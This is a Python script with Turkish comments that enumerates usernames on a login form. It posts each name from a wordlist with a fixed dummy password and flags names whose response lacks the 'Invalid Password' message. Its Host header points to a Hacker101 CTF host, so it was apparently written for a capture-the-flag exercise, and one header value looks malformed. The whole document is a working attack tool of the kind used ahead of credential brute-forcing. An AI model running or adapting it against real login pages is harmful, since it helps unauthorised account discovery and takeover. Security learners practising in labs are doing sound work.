# buradaki sistem INVALID_MATCH değeri responsede DÖNMEZSE geçerli value bulunmuş demektir
# burada username fuzlanıyor 
import os
import sys
import requests

# --- AYARLAR ---
TARGET_URL = "https://target.com/secure-login/"
INVALID_MATCH = "Invalid Password"

# Standart başlıklar (Content-Type ve Content-Length requests tarafından otomatik yönetilecek)
HEADERS = {
    "Host": "evil.ctf.hacker101.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://target.comtarget.com",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Priority": "u=4",
    "Te": "trailers"
}

def fuzz(wordlist_path):
    if not os.path.exists(wordlist_path):
        print(f"[-] Hata: Kelime listesi bulunamadı: {wordlist_path}")
        return

    print(f"[*] Fuzzing işlemi başlatılıyor... Hedef: {TARGET_URL}")
    print("[*] Geçerli kullanıcı adı aranıyor...\n")

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            username = line.strip()
            if not username:
                continue

            # Multipart verisini sözlük (dict) formatında hazırlıyoruz. 
            # Requests kütüphanesi bunu standartlara uygun multipart/form-data haline getirecektir.
            form_data = {
                "username": (None, username),
                "password": (None, "bshdds")
            }
            
            try:
                # İsteği files parametresi ile gönderiyoruz (multipart tetiklenir)
                response = requests.post(TARGET_URL, headers=HEADERS, files=form_data)
                
                # Sadece başarılı HTTP 200 durum kodlarını değerlendir ve hata mesajını ara
                if response.status_code == 200:
                    if INVALID_MATCH not in response.text:
                        print(f"\n[+] GEÇERLİ USERNAME BULUNDU: {username}")
                        print(f"[+] Yanıt Durumu: {response.status_code} | Boyut: {len(response.text)}")
                        # Doğru kullanıcı adını bulduğunda durmasını istersen alttaki satırı aktif et:
                        # break
                    else:
                        # İlerleme durumunu terminalde temiz göstermek için
                        print(f"[-] Deneniyor: {username:<20}", end="\r")
                else:
                    # HTTP 400, 500 gibi durumlarda hata çıktısı bas
                    print(f"\n[!] Sunucu hata döndürdü ({response.status_code}) - Kullanıcı adı: {username}")

            except requests.exceptions.RequestException as e:
                print(f"\n[-] Bağlantı hatası ({username}): {e}")

    print("\n\n[*] Tarama tamamlandı.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım: python3 fuzzer.py <wordlist_path>")
        sys.exit(1)

    wordlist_input = sys.argv[1]
    fuzz(wordlist_input)
